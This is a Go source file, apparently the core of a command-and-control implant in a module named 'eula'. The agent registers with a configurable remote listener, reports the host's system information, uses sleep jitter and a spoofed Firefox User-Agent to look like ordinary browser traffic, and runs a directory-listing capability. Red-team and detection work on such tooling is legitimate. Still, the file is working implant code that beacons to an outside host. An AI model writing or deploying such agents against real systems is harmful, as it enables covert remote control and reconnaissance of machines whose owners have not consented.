package core

import (
	"encoding/json"
	"eula/capabilities"
	"eula/config"
	"eula/connection"
	"eula/debug"
	"eula/info"
	"fmt"
)

type Agent struct {
	remoteHost           string
	remotePort           int
	sleeptime            float64
	sleeptimeJitter      float64
	agentType            string
	tasksUrlPaths        []string
	resultsUrlPaths      []string
	registrationUrlPaths []string
	extraHeaders         map[string]string
}

func NewAgent() *Agent {
	resolvedTasksUrlPaths := []string{"/tasks"}
	resolvedResultsUrlPaths := []string{"/results"}
	resolvedRegistrationUrlPaths := []string{"/register"}
	resolvedExtraHeaders := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0)"}

	if config.TasksUrlPathsJson != "" {
		err := json.Unmarshal([]byte(config.TasksUrlPathsJson), &resolvedTasksUrlPaths)
		if err != nil {
			debug.LogErr(err)
		}
	}
	if config.ResultsUrlPathsJson != "" {
		err := json.Unmarshal([]byte(config.ResultsUrlPathsJson), &resolvedResultsUrlPaths)
		if err != nil {
			debug.LogErr(err)
		}
	}
	if config.RegistrationUrlPathsJson != "" {
		err := json.Unmarshal([]byte(config.RegistrationUrlPathsJson), &resolvedRegistrationUrlPaths)
		if err != nil {
			debug.LogErr(err)
		}
	}
	if config.ExtraHeadersJson != "" {
		err := json.Unmarshal([]byte(config.ExtraHeadersJson), &resolvedExtraHeaders)
		if err != nil {
			debug.LogErr(err)
		}
	}

	return &Agent{
		remoteHost:           config.RemoteHost,
		remotePort:           config.RemotePort,
		sleeptime:            config.SleepTime,
		sleeptimeJitter:      config.SleepTimeJitter,
		agentType:            config.AgentType,
		tasksUrlPaths:        resolvedTasksUrlPaths,
		resultsUrlPaths:      resolvedResultsUrlPaths,
		registrationUrlPaths: resolvedRegistrationUrlPaths,
		extraHeaders:         resolvedExtraHeaders,
	}
}

func (a *Agent) Run() {
	conn := connection.NewConnection(
		a.remoteHost,
		a.remotePort,
		a.tasksUrlPaths,
		a.resultsUrlPaths,
		a.registrationUrlPaths,
		a.extraHeaders,
	)

	for {
		agentID, err := conn.RegisterWithListener(info.GetSystemInfo())
		if err != nil {
			debug.LogErr(err)
			continue
		}
		fmt.Println("Agent ID:", agentID)
		break
	}

	fmt.Println(info.GetSystemInfo())
	taskData := connection.TaskData{}
	result := capabilities.Ls(taskData)
	fmt.Println(result)
}
